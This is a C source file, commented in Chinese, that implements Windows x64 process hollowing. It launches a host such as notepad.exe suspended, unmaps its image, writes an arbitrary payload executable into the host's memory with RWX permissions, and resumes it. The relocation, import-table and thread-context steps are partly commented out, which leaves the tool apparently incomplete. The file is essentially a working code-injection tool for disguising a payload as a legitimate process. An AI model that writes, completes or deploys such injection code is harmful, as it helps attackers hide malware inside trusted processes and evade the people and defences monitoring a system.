#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <windows.h>
#include <Ntstatus.h>
#include <winternl.h>   // 需要这个头文件来使用 PROCESS_BASIC_INFORMATION
#pragma comment(lib, "ntdll.lib")


BYTE* ReadFileToBuffer(char* str1, size_t* OutSize)
{

	FILE* f = fopen(str1, "rb");
	size_t FileSize = 0;
	size_t read = 0;


	if (!f) {
		fprintf(stderr, "fopen fail!\n");
		fclose(f);
		return NULL;
	}

	fseek(f, 0, SEEK_END);
	FileSize = ftell(f);
	fseek(f, 0, SEEK_SET);

	BYTE* buf = (BYTE*)malloc(FileSize);
	if (!buf) {
		fprintf(stderr, "malloc fail!\n");
		fclose(f);
		return NULL;
	}
	
	read = fread(buf, 1, FileSize, f);

	if (read != FileSize) {
		fprintf(stderr, "fread fail!\n");
		fclose(f);
		return NULL;
	}
	*OutSize = FileSize;

	fprintf(stderr, "File readig Complete!  Size:%d\n", FileSize);
	return buf;
}

DWORD RVAToFOA(PIMAGE_NT_HEADERS64 pNtHeader, SIZE_T RVA) {
	DWORD SectionNumber = pNtHeader->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER pSecHeader = (PIMAGE_SECTION_HEADER)((BYTE*)pNtHeader + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + pNtHeader->FileHeader.SizeOfOptionalHeader);
	for (int i = 0; i < SectionNumber; i++, pSecHeader++)
	{

		DWORD secStart = pSecHeader->VirtualAddress;
		DWORD secEnd = secStart + pSecHeader->Misc.VirtualSize;
		if (RVA >= secStart && RVA < secEnd) {
			return RVA - secStart + pSecHeader->PointerToRawData;
		}
	}
	return 0;
}


// 定义 NtQueryInformationProcess 函数指针
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
	HANDLE ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength
	);
PVOID GetPebAddress(HANDLE hProcess)
{
	// 从 ntdll.dll 动态获取 NtQueryInformationProcess
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) return NULL;

	pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
	if (!NtQueryInformationProcess) {
		fprintf(stderr, "GET NtQueryInformationProcess fail!\n");
		return NULL;
	}

	PROCESS_BASIC_INFORMATION pbi = { 0 };
	ULONG returnLength = 0;
	NTSTATUS status = NtQueryInformationProcess(
		hProcess,
		ProcessBasicInformation,   // 值为 0
		&pbi,
		sizeof(pbi),
		&returnLength);

	if (status != 0) {
		fprintf(stderr, "NtQueryInformationProcess fail!\n");
		return NULL;
	}
	fprintf(stderr, "GET PebImageBase Complete!\n");
	return pbi.PebBaseAddress;
}
PVOID GetImageBaseAddress(HANDLE hProcess, PVOID pebAddress) {
	PVOID imageBase = NULL;
	SIZE_T BytesRead;
	SIZE_T offset = 0x10;
	if (!ReadProcessMemory(hProcess, (BYTE*)pebAddress + offset, &imageBase, 8, &BytesRead)) {
		fprintf(stderr, "ReadProcessMemory fail!\n");
		return NULL;
	}
	return imageBase;
}


typedef NTSTATUS(WINAPI* pZwUnmapViewOfSection)(HANDLE, PVOID); //定义ZwUnmapViewOfSection函数指针
void UnmapViewOfSection(HANDLE hProcess, PVOID BaseAddress) {
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	pZwUnmapViewOfSection ZwUnmapViewOfSection = (pZwUnmapViewOfSection)GetProcAddress(hNtdll, "ZwUnmapViewOfSection");
	if (!ZwUnmapViewOfSection) {
		fprintf(stderr, "GetProcAddress fail!\n");
	}
	printf("ZwUnmapViewOfSection GET!\n");

	NTSTATUS status = ZwUnmapViewOfSection(hProcess, BaseAddress);
	if (status == STATUS_SUCCESS) {
		printf("内存镜像卸载成功。\n");
	}
	else {
		printf("卸载失败，错误代码: 0x%X\n", status);
	}
}

void InstallImage(HANDLE hProcess, BYTE* buf, PVOID newBase) {
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buf;
	PIMAGE_NT_HEADERS64 pNtHeader = (PIMAGE_NT_HEADERS64)(buf + pDosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER pSecHeader = (PIMAGE_SECTION_HEADER)((BYTE*)pNtHeader + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + pNtHeader->FileHeader.SizeOfOptionalHeader);

	DWORD HeaderSize = pNtHeader->OptionalHeader.SizeOfHeaders;
	DWORD SectionNumber = pNtHeader->FileHeader.NumberOfSections;

	SIZE_T Written = 0;
	if (!WriteProcessMemory(hProcess, newBase, buf, HeaderSize, &Written)) {
		fprintf(stderr, "WriteProcessMemory1 fail!  errcode:%x\n", GetLastError());
		return ;
	}

	for (int i = 0; i < SectionNumber; i++, pSecHeader++) {

		LPVOID dest;
		LPVOID src;
		char name[9];
		DWORD SectionRVA = pSecHeader->VirtualAddress;
		DWORD SectionFOA = pSecHeader->PointerToRawData;
		SIZE_T Size = pSecHeader->SizeOfRawData;

		memset(name, 0, sizeof(name));
		memcpy(name, pSecHeader->Name, 8);
		printf("[Hollow] 写入节区 %s → 0x%llX\n", name,
			(unsigned long long)((ULONG_PTR)newBase + pSecHeader->VirtualAddress));
		

		dest = (BYTE*)newBase + SectionRVA;
		src = buf + SectionFOA;
		SIZE_T Written = 0;
		if (!WriteProcessMemory(hProcess, dest, src, Size, &Written)) {
			fprintf(stderr, "WriteProcessMemory2 fail!  errcode:%x\n", GetLastError());
			return;
		}
	}

	fprintf(stderr, "payload 写入成功\n");


}

void FixIAT(HANDLE hProcess, LPVOID newBase, BYTE* payload, PIMAGE_IMPORT_DESCRIPTOR pImportDes, PIMAGE_NT_HEADERS64 pNtHeader) {
	while (1) {
		if (pImportDes->Name == 0) break;
		char* pDllName = (char*)(payload + RVAToFOA(pNtHeader, pImportDes->Name));
	
		LPVOID RemoteMem = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		SIZE_T Written = 0;
		WriteProcessMemory(hProcess, RemoteMem, pDllName, strlen(pDllName) + 1, &Written);
		HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryA, RemoteMem, 0, NULL);
		
	
		HMODULE hDll = LoadLibraryA(pDllName);

		printf("\n=== DLL: %s === \n", pDllName);
		printf("OriginalFirstThunk(INT): %x\n", pImportDes->OriginalFirstThunk);
		printf("FirstThunk(IAT): %x\n", pImportDes->FirstThunk);
		PIMAGE_THUNK_DATA64 pINT = (PIMAGE_THUNK_DATA64)(payload + RVAToFOA(pNtHeader, pImportDes->OriginalFirstThunk));
		PIMAGE_THUNK_DATA64 pIAT = (PIMAGE_THUNK_DATA64)((BYTE*)newBase + pImportDes->FirstThunk);
		
		while (1) {
			if (pINT->u1.Ordinal == 0) break;
			if ((pINT->u1.Ordinal & 0x8000000000000000) == 0x8000000000000000) {
				printf("序号导入\n");
			}
			else {
				PIMAGE_IMPORT_BY_NAME pFuncName = (PIMAGE_IMPORT_BY_NAME)(payload + RVAToFOA(pNtHeader, pINT->u1.AddressOfData));
				FARPROC FuncAddress = GetProcAddress(hDll, pFuncName->Name);
				
				printf("pIAT:%llx [名字] hint=%d Name=%s Address:%llx\n", pIAT, pFuncName->Hint, pFuncName->Name, FuncAddress);
				DWORD OldProtected = 0;
				VirtualProtectEx(hProcess, (LPVOID)pIAT, sizeof(ULONG_PTR), PAGE_EXECUTE_READWRITE, &OldProtected);
				SIZE_T Written = 0;
				LPVOID buffer = 0;
				SIZE_T BytesRead = 0;
				//ReadProcessMemory(hProcess, (LPVOID)pIAT, buffer, 8, &BytesRead);
				//printf("%x\n", GetLastError());
				WriteProcessMemory(hProcess, (LPVOID)pIAT, (LPVOID)FuncAddress, sizeof(ULONG_PTR), &Written);
				VirtualProtectEx(hProcess, (LPVOID)pIAT, sizeof(ULONG_PTR), OldProtected, &OldProtected);	
			}
			pINT++;
			pIAT++;
		}

		pImportDes++;
	}
}


void FixRelocation(HANDLE hProcess, LPVOID newBase, LPVOID oldBase, PIMAGE_BASE_RELOCATION pRelocation) {
	printf("VirtualAddress: %x\n", pRelocation->VirtualAddress);
	printf("SizeOfBlock: %x\n", pRelocation->SizeOfBlock);

	if (pRelocation->SizeOfBlock == 0) {
		printf("不存在重定位表\n");
		return;
	}

	if (newBase == oldBase) {
		printf("不需要修复重定位表\n");
		return ;
	}
	ULONG_PTR delta = (ULONG_PTR)newBase - (ULONG_PTR)oldBase;
	DWORD BlockNumber = 0;
	printf("SizeOfBlock: %x\n", pRelocation->SizeOfBlock);
	
	while (1) {
		if (pRelocation->SizeOfBlock == 0) break;
		printf("\n=== 块 %d ===\n", BlockNumber++);

		DWORD item = (pRelocation->SizeOfBlock - sizeof(DWORD) * 2) / 2;
		printf("页面RVA: %x   重定位项数: %d\n", pRelocation->VirtualAddress, item);
		PWORD ptr_item = (PWORD)((BYTE*)pRelocation + sizeof(DWORD) * 2);
		for (int i = 0; i < item; i++)
		{

			if ((*(ptr_item + i) & 0xF000) == 0xA000) {
				WORD offest = *(ptr_item + i) & 0x0FFF;
				ULONG_PTR PatchVA = (ULONG_PTR)newBase + pRelocation->VirtualAddress + offest;
				DWORD OldProtected;
				VirtualProtectEx(hProcess, (LPVOID)PatchVA, sizeof(ULONG_PTR), PAGE_EXECUTE_READWRITE, &OldProtected);
				BYTE buffer[256]; // 缓冲区
				SIZE_T BytesRead = 0;

				ReadProcessMemory(hProcess, (LPCVOID)PatchVA, buffer, sizeof(ULONG_PTR), &BytesRead);
				printf("[%d] type=%x (DIR64)  offest=%x   patchRVA=%x\n", i, *(ptr_item + i) & 0xF000, offest, pRelocation->VirtualAddress + offest);
				printf("%llx -> ", *(ULONG_PTR*)buffer);
				*(ULONG_PTR*)buffer = (*(ULONG_PTR*)buffer + delta);
				printf("%llx\n", *(ULONG_PTR*)buffer);
				SIZE_T Written = 0;
				WriteProcessMemory(hProcess, (LPVOID)PatchVA, buffer, sizeof(ULONG_PTR), &Written);
				VirtualProtectEx(hProcess, (LPVOID)PatchVA, sizeof(ULONG_PTR), OldProtected, &OldProtected);
				
			}
		}
		pRelocation = (PIMAGE_BASE_RELOCATION)((BYTE*)pRelocation + pRelocation->SizeOfBlock);
	}
	printf("重定位表修复完成!\n");
}

int main(int argc, char* argv[]) {

	printf("用法: hollowing.exe <payload.exe> <host.exe>\n");
	printf("示例: hollowing.exe payload.exe C:\\Windows\\System32\\notepad.exe \n");
	if (argc != 3) return 0;

	BYTE* payload = 0;
	size_t payloadSize = 0;
	char* payloadPath = argv[1];
	char* hostPath = argv[2];
	char cmdLine[MAX_PATH];
	PVOID HostPebAddress = 0;
	PVOID HostImageBase = 0;
	PIMAGE_DOS_HEADER pDosHeader = NULL;
	PIMAGE_NT_HEADERS64 pNtHeader = NULL;

	
	payload = ReadFileToBuffer(payloadPath, &payloadSize);
	pDosHeader = (PIMAGE_DOS_HEADER)payload;
	pNtHeader = (PIMAGE_NT_HEADERS64)(payload + pDosHeader->e_lfanew);
	
	PIMAGE_DATA_DIRECTORY relocationDir = (PIMAGE_DATA_DIRECTORY)(&pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);
	PIMAGE_DATA_DIRECTORY ImportDir = (PIMAGE_DATA_DIRECTORY)(&pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);
	PIMAGE_BASE_RELOCATION pRelocation = (PIMAGE_BASE_RELOCATION)(payload + RVAToFOA(pNtHeader, relocationDir->VirtualAddress));
	PIMAGE_IMPORT_DESCRIPTOR pImportDes = (PIMAGE_IMPORT_DESCRIPTOR)(payload + RVAToFOA(pNtHeader, ImportDir->VirtualAddress));
	

	printf("payload: %x\n", payload);
	printf("ImageBase: %llx\n", pNtHeader->OptionalHeader.ImageBase);
	printf("pRelocation FOA：%x\n", RVAToFOA(pNtHeader, relocationDir->VirtualAddress));
	printf("relocationDir VirtualAddress: %x\n", relocationDir->VirtualAddress);
	printf("relocationDir Size: %x\n", relocationDir->Size);
	printf("RelocationVA: %x\n", pRelocation);
	/*printf("SizeOfBlock: %x\n", pRelocation->SizeOfBlock);
	printf("VirtualAddress: %x\n", pRelocation->VirtualAddress);*/

	//以挂起形式创建进程
	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };

	strncpy(cmdLine, hostPath, MAX_PATH - 1);
	cmdLine[MAX_PATH - 1] = '\0';

	//1.创建挂起进程
	BOOL ok = CreateProcessA(
		NULL,					//应用程序名，NULL 表示要用可写缓冲区
		cmdLine,				//命令行(可写)
		NULL, NULL,				//进程，线程安全
		FALSE,					//不继承句柄
		CREATE_SUSPENDED,		// 以挂起形式创建进程
		NULL, NULL,				// 环境变量、当前目录
		&si, &pi);
	if (!ok) {
		fprintf(stderr, "CreateProcessA fail!\n");
		return 0;
	}
	printf("[Host] PID=%lu TID=%lu\n",
		(unsigned long)pi.dwProcessId,
		(unsigned long)pi.dwThreadId);

	//2.通过PEB获取挂起进程的ImageBase
	HostPebAddress = GetPebAddress(pi.hProcess);
	HostImageBase = GetImageBaseAddress(pi.hProcess, HostPebAddress);
	printf("[Host] PEB=0x%llX ImageBase=0x%llX\n",
		(unsigned long long)(ULONG_PTR)HostPebAddress,
		(unsigned long long)HostImageBase);


	//3.卸载内存镜像
	UnmapViewOfSection(pi.hProcess, HostImageBase);
	printf("[Hollow] 已卸载宿主原 PE\n");
	
	//4.申请内存
	LPVOID newBase = VirtualAllocEx(pi.hProcess, HostImageBase, pNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (newBase == NULL) {
		fprintf(stderr, "VirtualAllocEx fail!\n");
	}
	printf("[Hollow] 分配内存: 0x%llX\n", (unsigned long long)(ULONG_PTR)newBase);

	//5.映射payload
	InstallImage(pi.hProcess, payload, newBase);

	//system("pause");
	//修复重定位表
	/*if ((LPVOID)pRelocation != (LPVOID)payload) {
		FixRelocation(pi.hProcess, newBase, (LPVOID)pNtHeader->OptionalHeader.ImageBase, pRelocation);
	}*/
	//修复IAT表
	//FixIAT(pi.hProcess, newBase, payload, pImportDes, pNtHeader);

	//6.修改函数入口点
	CONTEXT ctx = { 0 };
	memset(&ctx, 0, sizeof(ctx));
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(pi.hThread, &ctx);
	ULONG_PTR oldEntry = ctx.Rip;
	ULONG_PTR  newEntry = (ULONG_PTR)newBase + pNtHeader->OptionalHeader.AddressOfEntryPoint;
	ctx.Rip = newEntry;
	printf("RIP: %llx -> %llx\n", oldEntry, newEntry);


	//SetThreadContext(pi.hThread, &ctx);
	//system("pause");
	//getchar();
	//7.恢复线程执行！
	
	ResumeThread(pi.hThread);
	printf("[Hollow] 已恢复执行，等待 payload 运行...\n");

	WaitForSingleObject(pi.hProcess, 1000);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	free(payload);

	
	return 0;
}